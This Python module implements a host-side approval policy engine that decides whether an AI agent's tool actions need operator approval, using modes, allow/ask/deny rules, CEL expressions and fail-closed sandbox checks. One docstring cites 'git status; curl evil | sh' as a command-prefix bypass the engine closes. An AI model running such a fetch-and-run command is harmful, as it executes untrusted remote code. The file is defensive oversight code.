"""Host-owned approval policy engine.

This module answers one question: *does this action need operator approval?*
It is the only place that decision lives — the mode dial, the allow/ask/deny
rules, the effect-tier ladder, and the sandbox-as-boundary downgrade all
converge on :func:`decide`. Keeping it here (not in the kernel, not in a
pack, not in the CLI) is what keeps the layers cohesive:

- The **kernel** owns the receipt (exact-action, single-use, TTL). Unchanged.
- The **host** owns this decision. The kernel and transports only see an
  :class:`~kernel.approval.ApprovalService`.
- **Packs** publish *facts* (e.g. "this command is contained in a sandbox");
  they never decide policy.
- The **CLI** renders a :class:`PolicyDecision`; it never decides.

Boundary rules enforced by this module:

- **Deny is loud.** A denied action raises (the registry surfaces it to the
  model as a tool error so it can reroute); it is never silently skipped.
- **Fail closed.** Unknown or degraded containment is treated as *not*
  contained, so an unsandboxed ``rm`` can never be auto-approved by mistake.
  A missing or corrupt ``policy.yaml`` resolves to ``mode: ask`` with no
  rules — toward prompting, never toward allowing. The same contract
  governs rule ``when`` expressions: one that does not compile fails the
  whole document to the ask-mode default, and an evaluation error at
  decision time prompts instead of skipping the rule.
- **`external_write` is never auto-approved** by the sandbox downgrade: the
  sandbox is a *filesystem/process* boundary, and by definition an
  ``external_write`` (cloud APIs, PRs, email) escapes it.

The sandbox fact is read from a neutral JSON file a pack writes under
``<data_dir>/run/<session_key>/sandbox-facts.json`` — the host does not import
pack code. See :func:`read_containment` for the contract.
"""

from __future__ import annotations

import json
import logging
import shlex
from dataclasses import dataclass
from enum import StrEnum
from pathlib import Path
from typing import Any

import yaml
from pydantic import BaseModel, Field
from sdk.filelock import atomic_write_text, file_lock, sidecar_lock_path
from sdk.identity import execution_scope_key

logger = logging.getLogger(__name__)

__all__ = [
    "DEFAULT_POLICY_PATH",
    "VERDICT_ALLOW",
    "VERDICT_ASK",
    "VERDICT_DENY",
    "PolicyDecision",
    "PolicyDocument",
    "PolicyExpressionError",
    "PolicyMode",
    "PolicyRule",
    "decide",
    "load_policy",
    "load_policy_with_errors",
    "read_containment",
    "remember_allow_prefix",
    "sandbox_session_key",
    "validate_rule_expressions",
    "write_policy",
]

#: The policy file lives beside the other durable host state.
DEFAULT_POLICY_PATH = "policy.yaml"

#: Decision verdicts (string constants so ``PolicyDecision`` stays a plain
#: dataclass that transports can serialize without importing the enum).
VERDICT_ALLOW = "allow"
VERDICT_ASK = "ask"
VERDICT_DENY = "deny"


class PolicyMode(StrEnum):
    """The approval posture for actions not settled by a rule or containment.

    - ``ASK``   - prompt for any effectful action (today's behavior).
    - ``TRUST`` - allow ``write``/``execute`` without asking; ``external_write``
      still prompts. The "I'm actively driving and trust the workspace" mode.
    - ``PLAN``  - deny all effectful actions: read-only exploration only.
    """

    ASK = "ask"
    TRUST = "trust"
    PLAN = "plan"


# Effect kinds in rising-risk order. The ladder is the fallback when no rule
# and no containment applies; higher index = higher risk.
_EFFECT_TIER: tuple[str, ...] = ("read", "write", "execute", "external_write")

#: Effects the mode dial may auto-allow in TRUST (external_write never).
_TRUST_AUTO_EFFECTS: frozenset[str] = frozenset({"write", "execute"})

#: Cap on how many actions one turn may auto-approve before the host stops
#: pre-empting the prompt. A runaway loop should surface as a prompt, not a
#: burn through the ledger. (Enforced by the caller; the constant lives here.)
#: See ``runtime.policy_service`` / ``handle_message``.
AUTO_APPROVE_TURN_CAP = 10

#: Only these effects may be downgraded by sandbox containment. ``write`` and
#: below never gate in ``ask`` mode anyway, and ``external_write`` escapes the
#: sandbox by definition, so neither is eligible.
_DOWNGRADE_ELIGIBLE_EFFECTS: frozenset[str] = frozenset({"execute"})

#: Containment states that permit the downgrade. Anything else — "none"
#: (no sandbox), "degraded" (sandbox present but cannot run), or a missing /
#: unreadable fact — is treated as *not* contained (fail closed).
_CONTAINED_STATES: frozenset[str] = frozenset({"contained"})

#: Parameter keys that carry the shell command for ``execute``-effect tools.
#: Checked in order; the first present non-empty string wins. ``command`` is
#: bash_run's parameter; ``argv`` is bwrap_run's (a list).
_COMMAND_PARAM_KEYS: tuple[str, ...] = ("command", "argv", "cmd", "script")


class PolicyExpressionError(Exception):
    """A rule's CEL ``when`` expression failed to compile or evaluate.

    Raised by :func:`_cel_program` (compile) and :func:`_eval_when`
    (evaluation). The engine treats both as fail-closed signals: a document
    with a non-compiling expression loads as ask-mode defaults, and an
    evaluation error mid-decision prompts rather than skipping the rule —
    a skipped ``deny`` would be an allowed ``rm``.
    """


#: Compiled CEL programs keyed by the raw expression text. ``None`` caches
#: a known compile failure so a broken expression is not re-parsed on every
#: request. The policy file is re-read on every approval request
#: (:func:`load_policy` -> ``PolicyApprovalService``), so compilation MUST be
#: cached; ``celpy.Environment.compile`` parses the expression every call.
_CEL_RUNNERS: dict[str, Any | None] = {}


def _cel_program(when: str) -> Any:
    """Compile (or fetch from cache) the CEL program for ``when``.

    Raises :class:`PolicyExpressionError` on a compile failure; the failure
    is cached as ``None`` so the same broken text fails fast on every later
    call instead of re-parsing per request.
    """
    if when in _CEL_RUNNERS:
        program = _CEL_RUNNERS[when]
    else:
        try:
            import celpy  # lazy: hosts without when-rules never pay

            env = celpy.Environment()
            program = env.program(env.compile(when))
        except Exception as exc:  # pylint: disable=broad-except  # any parse error
            program = None
            _CEL_RUNNERS[when] = None
            raise PolicyExpressionError(f"CEL compile failed for {when!r}: {exc}") from exc
        _CEL_RUNNERS[when] = program
    if program is None:
        raise PolicyExpressionError(f"CEL compile failed for {when!r} (cached)")
    return program


def _truthy(value: Any) -> bool:
    """Coerce a CEL result to a Python bool, tolerating celpy's bool types."""
    if isinstance(value, bool):
        return value
    try:
        return bool(value)
    except Exception:  # pylint: disable=broad-except
        return False


def _eval_when(when: str, activation: dict[str, Any]) -> bool:
    """Evaluate a rule's ``when`` expression, raising on failure.

    Unlike the model router (which skips a rule on a CEL evaluation error and
    falls back to its static pin — safe there), a policy rule evaluation
    error is a fail-closed signal: the caller prompts instead of silently
    skipping what may be a ``deny``.
    """
    program = _cel_program(when)
    try:
        return _truthy(program.evaluate(activation))
    except Exception as exc:  # pylint: disable=broad-except  # celpy raises CELEvalError
        raise PolicyExpressionError(f"CEL evaluation failed for {when!r}: {exc}") from exc


def _cel_activation(
    invocation: Any, command: str, argv: tuple[str, ...], containment: str
) -> dict[str, Any]:
    """Build the CEL activation context for one invocation.

    Bindings (mirror the model router's ``_build_activation`` shape):

    - ``action.tool`` / ``action.effect`` / ``action.pack`` — the structural
      matcher inputs, for expression-only rules.
    - ``action.command`` — the extracted shell command string (if any).
    - ``action.argv`` — the shell-command tokens: the ``argv`` parameter when
      the tool carries one, else ``shlex.split`` of the command string.
      Token matching here closes the ``command_prefix`` bypass (``git status;
      curl evil | sh`` starts with ``git status`` but its argv tokens tell
      the truth).
    - ``action.parameters`` — the invocation's full parameter mapping.
    - ``identity.*`` — workspace/user/surface/mode/scope fields, duck-typed
      (tests stub these with ``SimpleNamespace``).
    - ``containment`` — the resolved sandbox state string
      (``contained|degraded|none|unknown``).
    """
    import celpy  # lazy: hosts without when-rules never pay

    identity = getattr(invocation, "identity", None)

    def _field(name: str) -> str:
        return str(getattr(identity, name, "") or "")

    return {
        "action": celpy.json_to_cel(
            {
                "tool": str(getattr(invocation, "target_id", "") or ""),
                "effect": str(getattr(invocation, "effect", "") or ""),
                "pack": str(getattr(invocation, "pack_id", "") or ""),
                "command": command,
                "argv": list(argv),
                "parameters": dict(getattr(invocation, "parameters", None) or {}),
            }
        ),
        "identity": celpy.json_to_cel(
            {
                "workspace_id": _field("workspace_id"),
                "user_slug": _field("user_slug"),
                "surface_id": _field("surface_id"),
                "surface_type": _field("surface_type"),
                "mode_id": _field("mode_id"),
                "memory_scope": _field("memory_scope"),
            }
        ),
        "containment": containment,
    }


def _argv_from_parameters(parameters: dict[str, Any]) -> tuple[str, ...]:
    """Extract the shell-command token list from an invocation's parameters.

    ``argv`` when the tool carries an argv vector; otherwise ``shlex.split``
    of the command string so ``bash_run -c 'echo hi'`` yields the program
    tokens the operator wrote. Falls back to an empty tuple.
    """
    raw_argv = parameters.get("argv")
    if isinstance(raw_argv, (list, tuple)) and raw_argv:
        return tuple(str(part) for part in raw_argv)
    for key in ("command", "cmd", "script"):
        value = parameters.get(key)
        if isinstance(value, str) and value.strip():
            try:
                return tuple(shlex.split(value))
            except ValueError:  # unbalanced quotes: fail closed to no tokens
                return ()
    return ()


class PolicyRule(BaseModel):
    """One allow/ask/deny rule. Any subset of matchers; all present must match.

    Matchers (v1, deliberately small):

    - ``tool``           — exact ``target_id`` (e.g. ``bash_run``).
    - ``effect``         — exact effect kind (``read|write|execute|external_write``).
    - ``pack``           — exact ``pack_id``.
    - ``command_prefix`` — the action's shell command starts with this string
      (normalized leading whitespace). Only meaningful for ``execute`` tools
      that carry a command parameter.
    - ``when``           — an optional [CEL](https://github.com/google/cel-spec)
      boolean expression evaluated against the activation bindings (see
      :func:`_cel_activation`). All present matchers AND the expression must
      hold. A ``when``-only rule is valid — the expression is a matcher. A
      rule with no matchers at all matches nothing.

    CEL rules are fail-closed, unlike the model router's: a document whose
    expression does not compile loads as ask-mode defaults, and an evaluation
    error mid-decision prompts instead of skipping the rule.
    """

    tool: str = ""
    effect: str = ""
    pack: str = ""
    command_prefix: str = ""
    when: str = ""

    def describe(self) -> str:
        """A compact human-readable label for diagnostics and /permissions."""
        parts = [
            f"{key}={value}"
            for key, value in (
                ("tool", self.tool),
                ("effect", self.effect),
                ("pack", self.pack),
                ("command_prefix", self.command_prefix),
                ("when", self.when),
            )
            if value
        ]
        return " ".join(parts) or "(no matchers)"


class PolicyDocument(BaseModel):
    """The parsed ``policy.yaml`` document.

    ``version`` is forward-compat scaffolding; v1 is the only schema today.
    Lists are evaluated in a fixed order — deny, then ask, then allow — with
    first match winning, independent of the order keys appear in the file.
    """

    version: int = 1
    mode: PolicyMode = PolicyMode.ASK
    sandbox_downgrade: bool = True
    bare_requires_approval: bool = True
    allow: list[PolicyRule] = Field(default_factory=list)
    ask: list[PolicyRule] = Field(default_factory=list)
    deny: list[PolicyRule] = Field(default_factory=list)


@dataclass(frozen=True, slots=True)
class PolicyDecision:
    """The engine's verdict for one invocation.

    ``verdict`` is one of the ``VERDICT_*`` constants. ``reason`` is a
    human-readable explanation for the transport (and for ``/approve <id>
    why``). ``matched_rule`` is the rule that fired, when one did; ``tier``
    and ``containment`` carry the resolved ladder tier and the sandbox state
    the decision used, so a transport can badge them without re-deriving.
    """

    verdict: str
    reason: str
    tier: str = ""
    containment: str = ""
    matched_rule: PolicyRule | None = None

    def __str__(self) -> str:  # pragma: no cover - convenience
        return f"{self.verdict}: {self.reason}"


# ── Loading ─────────────────────────────────────────────────────────────


def _policy_path(data_dir: Path) -> Path:
    """Return the policy.yaml path under the config category."""
    from sdk.layout import CONFIG_DIR

    return Path(data_dir) / CONFIG_DIR / DEFAULT_POLICY_PATH


def validate_rule_expressions(rules: list[PolicyRule]) -> list[str]:
    """Compile-check the ``when`` expression on each rule, returning errors.

    Shared surface for write paths (``/policy rule add``) that must reject a
    non-compiling expression BEFORE persisting it — a bad expression in the
    file fails the whole document to ask-mode defaults on the next load
    (see :func:`load_policy_with_errors`), so the add is the right place to
    fail. Returns one error string per broken rule, naming the rule.
    """
    errors: list[str] = []
    for index, rule in enumerate(rules, start=1):
        if not rule.when:
            continue
        try:
            _cel_program(rule.when)
        except PolicyExpressionError as exc:
            errors.append(f"rule {index} ({rule.describe()}): {exc}")
    return errors


def _compile_check_when(doc: PolicyDocument, path: Path) -> list[str]:
    """Compile-check every rule's ``when`` expression, returning diagnostics.

    Any failure fails the whole document (the caller swaps in ask-mode
    defaults): one bad rule never widens what is allowed — every load
    error resolves toward prompting, never toward allowing.
    """
    errors: list[str] = []
    for list_name in ("deny", "ask", "allow"):
        for detail in validate_rule_expressions(getattr(doc, list_name)):
            errors.append(f"{path.name}: {list_name} {detail}; using ask-mode defaults")
    return errors


def _read_policy_yaml(path: Path) -> tuple[PolicyDocument | None, str]:
    """Read and validate the raw YAML document at ``path``.

    Returns ``(doc, "")`` on success, ``(None, diagnostic)`` on any failure —
    missing file, unreadable, invalid YAML, not a mapping, failed validation.
    Never raises; the diagnostic is ready for the load-errors surface.
    """
    try:
        if not path.is_file():
            return PolicyDocument(), ""
        raw = yaml.safe_load(path.read_text(encoding="utf-8"))
    except (OSError, yaml.YAMLError) as exc:
        logger.warning("policy: failed to load %s (%s); using ask-mode default", path, exc)
        return None, f"{path.name}: unreadable or invalid YAML ({exc})"
    if raw is None:
        return PolicyDocument(), ""
    if not isinstance(raw, dict):
        logger.warning("policy: %s is not a mapping; using ask-mode default", path)
        return None, f"{path.name}: not a mapping"
    try:
        return PolicyDocument.model_validate(raw), ""
    except Exception as exc:  # pydantic.ValidationError plus any mapping errors
        logger.warning("policy: %s failed validation (%s); using ask-mode default", path, exc)
        return None, f"{path.name}: failed validation ({exc})"


def load_policy_with_errors(data_dir: Path) -> tuple[PolicyDocument, list[str]]:
    """Load the policy, returning the document plus load-error diagnostics.

    Never raises. Mirrors :func:`load_policy`'s fail-closed contract — a
    missing, unreadable, invalid, or non-mapping file resolves to the ask-mode
    default document — and additionally compile-checks every rule's ``when``
    expression: a non-compiling expression fails the whole document to the
    ask-mode default (consistent with corrupt YAML: one bad rule never
    widens what is allowed; every load error resolves toward prompting).

    The second return value is a list of human-readable diagnostics (empty
    on a clean load) for the ``/policy`` render — the policy engine has no
    ``/models apply``-style gate to surface a broken expression earlier, so
    the render is the discovery surface.
    """
    path = _policy_path(data_dir)
    doc, diagnostic = _read_policy_yaml(path)
    if diagnostic:
        return PolicyDocument(), [f"{diagnostic}; using ask-mode defaults"]
    assert doc is not None  # for the type checker: diagnostic implies failure
    # Compile-check every rule's when expression. Any failure fails the
    # whole document to the ask-mode default — toward prompting, never
    # toward allowing.
    errors = _compile_check_when(doc, path)
    if errors:
        return PolicyDocument(), errors
    return doc, errors


def load_policy(data_dir: Path) -> PolicyDocument:
    """Load ``<data_dir>/config/policy.yaml``, failing closed to the ask-mode default.

    Never raises: a missing, unreadable, invalid file — or one whose CEL
    ``when`` expressions do not compile — resolves to the default document
    (``mode: ask``, ``sandbox_downgrade: true``, no rules), so the safe
    behavior — prompt — is the behavior on any error.
    """
    return load_policy_with_errors(data_dir)[0]


def remember_allow_prefix(data_dir: Path, *, tool: str, command_prefix: str) -> Path:
    """Append an ``allow`` rule for ``tool`` + ``command_prefix`` to policy.yaml.

    This is the host-side write behind ``/approve <id> --remember`` and the
    'a' approval key. The host owns policy writes so the CLI never touches the
    file directly — the CLI sends the command, the host persists the rule.

    Creates the file with a default header when absent. The write appends to
    the ``allow`` block, preserving whatever is already there. Returns the
    path written.
    """
    path = _policy_path(data_dir)
    with file_lock(sidecar_lock_path(path)):
        doc = load_policy(data_dir)
        prefix = command_prefix.strip()
        rule = PolicyRule(tool=tool, command_prefix=prefix)
        if not any(r.tool == tool and r.command_prefix == prefix for r in doc.allow):
            doc.allow.append(rule)
        _write_policy(path, doc)
    logger.info("policy: remembered allow rule %s", rule.describe())
    return path


def write_policy(data_dir: Path, doc: PolicyDocument) -> Path:
    """Persist ``doc`` as ``<data_dir>/policy.yaml`` with the standard header.

    The public write behind the ``/policy`` command's mode/bare edits: load,
    mutate, write back — preserving whatever rule lists the document already
    carries. Returns the path written.
    """
    path = _policy_path(data_dir)
    with file_lock(sidecar_lock_path(path)):
        _write_policy(path, doc)
    return path


def _write_policy(path: Path, doc: PolicyDocument) -> None:
    """Serialize ``doc`` to ``path`` as a clean, commented YAML document."""
    payload = {
        "version": doc.version,
        "mode": doc.mode.value,
        "sandbox_downgrade": doc.sandbox_downgrade,
        "bare_requires_approval": doc.bare_requires_approval,
        "allow": [r.model_dump(exclude_defaults=True) for r in doc.allow],
        "ask": [r.model_dump(exclude_defaults=True) for r in doc.ask],
        "deny": [r.model_dump(exclude_defaults=True) for r in doc.deny],
    }
    body = yaml.safe_dump(payload, sort_keys=False, default_flow_style=False)
    header = (
        "# Lisa approval policy. Decide which actions need operator approval.\n"
        "# mode: ask|trust|plan   sandbox_downgrade: auto-approve sandboxed commands\n"
        "# bare_requires_approval: prompt for execute actions that are NOT sandboxed\n"
        "#   (containment none/degraded/unknown) even under trust mode.\n"
        "# Rules: allow/ask/deny lists, evaluated deny -> ask -> allow, first match.\n"
        "# Matchers: tool, effect (read|write|execute|external_write), pack,\n"
        "#   command_prefix, when (CEL expression; see docs/POLICY_GUIDE.md).\n"
    )
    atomic_write_text(path, header + body, encoding="utf-8")


# ── Containment fact ─────────────────────────────────────────────────────


def sandbox_session_key(identity: Any) -> str:
    """Recompute the bash session key from an approval identity.

    The bash pack keys its sessions by :func:`sdk.identity.execution_scope_key`,
    so the engine can find the pack's containment fact without importing pack
    code. Both sides call the one SDK definition; this wrapper only names the
    engine-side intent.
    """
    return execution_scope_key(identity)


def read_containment(data_dir: Path, identity: Any) -> dict[str, str]:
    """Read the sandbox containment fact for ``identity``, failing closed.

    Returns a dict with a ``containment`` key of ``contained`` / ``degraded``
    / ``none`` / ``unknown``. ``unknown`` means no fact file exists (the pack
    never wrote one) — treated as *not* contained by the decision ladder.
    ``degraded`` carries a ``reasons`` list the transport can surface.
    """
    key = sandbox_session_key(identity)
    from sdk.layout import RUN_DIR

    path = Path(data_dir) / RUN_DIR / key / "sandbox-facts.json"
    try:
        if not path.is_file():
            return {"containment": "unknown"}
        payload = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as exc:
        logger.debug("policy: containment fact unreadable (%s); failing closed", exc)
        return {"containment": "unknown"}
    if not isinstance(payload, dict):
        return {"containment": "unknown"}
    state = str(payload.get("containment", "") or "unknown").strip() or "unknown"
    reasons = payload.get("reasons")
    out = {"containment": state}
    if isinstance(reasons, list) and reasons:
        out["reasons"] = ", ".join(str(r) for r in reasons)
    return out


# ── Rule matching ────────────────────────────────────────────────────────


def _command_from_parameters(parameters: dict[str, Any]) -> str:
    """Extract the shell command string from an invocation's parameters.

    Checks the known command-carrying keys in order; for ``argv``-style list
    values joins with spaces so a ``command_prefix`` rule matches the program.
    """
    for key in _COMMAND_PARAM_KEYS:
        value = parameters.get(key)
        if isinstance(value, str) and value.strip():
            return value.strip()
        if isinstance(value, (list, tuple)) and value:
            return " ".join(str(part) for part in value).strip()
    return ""


def _when_matches(rule: PolicyRule, activation: dict[str, Any] | None) -> bool:
    """Evaluate a rule's ``when`` expression against the activation.

    Fail-closed by construction: an evaluation error raises
    :class:`PolicyExpressionError` (decide catches it and prompts) instead of
    returning False — a skipped ``deny`` would be an allowed ``rm``. Returns
    False (never raises) when no activation is available: the caller cannot
    prove a match, and only prove-side failure tolerates a non-match here
    because the ladder below still fails toward prompting.
    """
    if activation is None:
        return False  # defensive: no activation -> cannot prove a match
    return _eval_when(rule.when, activation)


def _rule_matches(
    rule: PolicyRule,
    *,
    invocation: Any,
    command: str,
    activation: dict[str, Any] | None = None,
) -> bool:
    """Return True when every present matcher on ``rule`` matches ``invocation``."""
    # Exact matchers are data-driven; the two shape-dependent matchers
    # (command_prefix, when) keep explicit branches below so their matching
    # semantics stay lazy and readable.
    exact = (
        ("tool", str(getattr(invocation, "target_id", "") or "")),
        ("effect", str(getattr(invocation, "effect", "") or "")),
        ("pack", str(getattr(invocation, "pack_id", "") or "")),
    )
    present = False
    for key, actual in exact:
        expected = getattr(rule, key)
        if expected:
            present = True
            if expected != actual:
                return False
    if rule.command_prefix:
        present = True
        if not command or not command.startswith(rule.command_prefix):
            return False
    if rule.when:
        present = True
        if not _when_matches(rule, activation):
            return False
    # A rule with no matchers matches nothing (an empty rule is not a wildcard).
    return present


def _match(
    rules: list[PolicyRule],
    *,
    invocation: Any,
    command: str,
    activation: dict[str, Any] | None = None,
) -> PolicyRule | None:
    """Return the first matching rule in ``rules``, or None."""
    for rule in rules:
        if _rule_matches(rule, invocation=invocation, command=command, activation=activation):
            return rule
    return None


def _tier_of(effect: str) -> int:
    """Return the ladder index for ``effect`` (0 = read, highest = external_write)."""
    try:
        return _EFFECT_TIER.index(effect)
    except ValueError:
        # Unknown effects rank as the riskiest known tier (fail toward prompting).
        return len(_EFFECT_TIER) - 1


# ── The decision ─────────────────────────────────────────────────────────


def _prepare_activation(
    policy: PolicyDocument, invocation: Any, parameters: dict[str, Any], data_dir: Path | None
) -> tuple[dict[str, Any] | None, str]:
    """Resolve the CEL activation (or None) and its containment binding.

    Returns ``(activation, containment)``. The containment read is hoisted
    ONLY when some rule has a ``when`` expression — documents without
    when-rules keep zero extra I/O per decision (the ladder's own downgrade
    step reads the fact lazily as before).
    """
    if not any(r.when for r in (*policy.deny, *policy.ask, *policy.allow)):
        return None, ""
    if data_dir is None:
        containment = "unknown"
    else:
        fact = read_containment(data_dir, getattr(invocation, "identity", None))
        containment = str(fact.get("containment", "unknown") or "unknown")
    activation = _cel_activation(
        invocation,
        _command_from_parameters(parameters),
        _argv_from_parameters(parameters),
        containment,
    )
    return activation, containment


def _match_rule(
    policy: PolicyDocument,
    *,
    invocation: Any,
    command: str,
    tier: str,
    activation: dict[str, Any] | None = None,
    containment: str = "",
) -> PolicyDecision | None:
    """Evaluate explicit rules, deny -> ask -> allow, first match wins.

    Returns the settled decision, or None when no rule matches and the caller
    should continue down the ladder.
    """
    deny = _match(policy.deny, invocation=invocation, command=command, activation=activation)
    if deny is not None:
        return PolicyDecision(
            verdict=VERDICT_DENY,
            reason=f"denied by policy rule: {deny.describe()}",
            tier=tier,
            containment=containment,
            matched_rule=deny,
        )
    ask = _match(policy.ask, invocation=invocation, command=command, activation=activation)
    if ask is not None:
        return PolicyDecision(
            verdict=VERDICT_ASK,
            reason=f"ask rule matched: {ask.describe()}",
            tier=tier,
            containment=containment,
            matched_rule=ask,
        )
    allow = _match(policy.allow, invocation=invocation, command=command, activation=activation)
    if allow is not None:
        return PolicyDecision(
            verdict=VERDICT_ALLOW,
            reason=f"allow rule matched: {allow.describe()}",
            tier=tier,
            containment=containment,
            matched_rule=allow,
        )
    return None


def _containment_decision(
    policy: PolicyDocument, *, invocation: Any, effect: str, tier: str, data_dir: Path | None
) -> tuple[PolicyDecision | None, str]:
    """Apply the sandbox-as-boundary downgrade.

    Returns (decision-or-None, resolved-containment). Only ``execute`` actions
    are eligible, and only when the pack reports a genuinely contained state:
    external_write escapes the sandbox by definition, and degraded/unknown
    facts fail closed (so an unsandboxed ``rm`` can never be auto-approved).
    A ``degraded`` result short-circuits to ``ask`` so the operator is told the
    sandbox could not run rather than being silently downgraded.
    """
    containment = "unknown"
    eligible = effect in _DOWNGRADE_ELIGIBLE_EFFECTS
    if not policy.sandbox_downgrade or not eligible or data_dir is None:
        return None, containment
    fact = read_containment(data_dir, getattr(invocation, "identity", None))
    containment = str(fact.get("containment", "unknown") or "unknown")
    if containment in _CONTAINED_STATES:
        return (
            PolicyDecision(
                verdict=VERDICT_ALLOW,
                reason="sandboxed command (contained); auto-approved by sandbox boundary",
                tier=tier,
                containment=containment,
            ),
            containment,
        )
    if containment == "degraded":
        return (
            PolicyDecision(
                verdict=VERDICT_ASK,
                reason=f"sandbox degraded ({fact.get('reasons', 'unknown')}); prompting",
                tier=tier,
                containment=containment,
            ),
            containment,
        )
    return None, containment


def _bare_mode_decision(
    policy: PolicyDocument, *, effect: str, tier: str, containment: str
) -> PolicyDecision | None:
    """Require explicit approval for execute actions that are NOT sandboxed.

    This is the guard on the user's chosen 'bare' mode: a contained action
    auto-approves at the sandbox boundary, but a bare host run must never be
    silently allowed by TRUST mode. When ``bare_requires_approval`` is on and
    an ``execute`` action is running without containment, this short-circuits
    to ``ask`` before the mode fallback can auto-allow it.
    """
    if (
        policy.bare_requires_approval
        and effect in _DOWNGRADE_ELIGIBLE_EFFECTS
        and containment not in _CONTAINED_STATES
    ):
        return PolicyDecision(
            verdict=VERDICT_ASK,
            reason="unsandboxed host execution; explicit approval required",
            tier=tier,
            containment=containment,
        )
    return None


def _settle_rules(
    policy: PolicyDocument,
    *,
    invocation: Any,
    command: str,
    tier: str,
    activation: dict[str, Any] | None,
    containment: str,
) -> PolicyDecision | None:
    """Run the explicit-rule step (1-3), fail-closed on expression errors.

    A CEL evaluation error prompts instead of skipping what may be a deny
    rule — the router's skip-and-continue would be fail-open here.
    """
    try:
        return _match_rule(
            policy,
            invocation=invocation,
            command=command,
            tier=tier,
            activation=activation,
            containment=containment,
        )
    except PolicyExpressionError as exc:
        logger.warning("policy: %s; prompting", exc)
        return PolicyDecision(
            verdict=VERDICT_ASK,
            reason=f"policy rule expression failed ({exc}); prompting",
            tier=tier,
            containment=containment or "unknown",
        )


def decide(
    *,
    policy: PolicyDocument,
    invocation: Any,
    data_dir: Path | None = None,
) -> PolicyDecision:
    """Decide whether ``invocation`` needs operator approval.

    The evaluation order is fixed and total. Each step is short-circuiting:

    1. A ``deny`` rule matches -> ``deny`` (loud; the caller raises).
    2. An ``ask`` rule matches -> ``ask``.
    3. An ``allow`` rule matches -> ``allow``.
    4. Containment downgrade: a sandboxed ``execute`` action is auto-allowed
       when ``sandbox_downgrade`` is on. This is the "approval only when not
       sandboxed" rule.
    5. Mode fallback - ``plan`` denies all effectful actions, ``trust`` allows
       ``write``/``execute``, ``ask`` prompts. ``read`` never prompts.

    ``data_dir`` is only consulted for the containment fact in step 4; pass it
    (the host data dir) whenever the invocation could be sandbox-contained.
    """
    effect = str(getattr(invocation, "effect", "") or "")
    tier = _EFFECT_TIER[min(_tier_of(effect), len(_EFFECT_TIER) - 1)]
    parameters = getattr(invocation, "parameters", None) or {}
    command = _command_from_parameters(parameters)
    activation, containment = _prepare_activation(policy, invocation, parameters, data_dir)

    # 1-3. Explicit rules, deny -> ask -> allow, first match wins. A CEL
    # evaluation error is fail-closed: prompt instead of skipping what may
    # be a deny rule (the router's skip-and-continue would be fail-open here).
    settled = _settle_rules(
        policy,
        invocation=invocation,
        command=command,
        tier=tier,
        activation=activation,
        containment=containment,
    )
    if settled is not None:
        return settled

    # 4. Sandbox-as-boundary downgrade.
    downgraded, containment = _containment_decision(
        policy, invocation=invocation, effect=effect, tier=tier, data_dir=data_dir
    )
    if downgraded is not None:
        return downgraded

    # 5. Mode fallback - blanket-deny first. PLAN's deny is stricter than the
    # bare-mode guard and must win: a plan-mode execute is denied, not asked.
    return _mode_fallback_decision(
        policy, effect=effect, tier=tier, containment=containment, data_dir=data_dir
    )


def _mode_fallback_decision(
    policy: PolicyDocument,
    *,
    effect: str,
    tier: str,
    containment: str,
    data_dir: Path | None,
) -> PolicyDecision:
    """Apply the mode-fallback decision (step 5 of ``decide``).

    Read-only actions allow; PLAN mode blanket-denies effectful actions;
    TRUST mode allows its auto-effects (subject to the bare-execute guard);
    everything else asks. A bare (unsandboxed) execute action needs explicit
    approval instead of TRUST's silent allow - the user's floor may permit
    bare, but it is never allowed without a prompt.
    """
    if effect == "read":
        return PolicyDecision(
            verdict=VERDICT_ALLOW,
            reason="read-only action",
            tier=tier,
            containment=containment,
        )
    if policy.mode is PolicyMode.PLAN:
        return PolicyDecision(
            verdict=VERDICT_DENY,
            reason=f"plan mode: {effect} actions are denied (read-only exploration only)",
            tier=tier,
            containment=containment,
        )
    if data_dir is None:
        containment = "unknown"
    if policy.mode is PolicyMode.TRUST and effect in _TRUST_AUTO_EFFECTS:
        bare = _bare_mode_decision(policy, effect=effect, tier=tier, containment=containment)
        if bare is not None:
            return bare
        return PolicyDecision(
            verdict=VERDICT_ALLOW,
            reason=f"trust mode: {effect} actions allowed",
            tier=tier,
            containment=containment,
        )
    # Default / ASK mode / trust-mode external_write.
    return PolicyDecision(
        verdict=VERDICT_ASK,
        reason=f"{effect} action requires approval",
        tier=tier,
        containment=containment,
    )
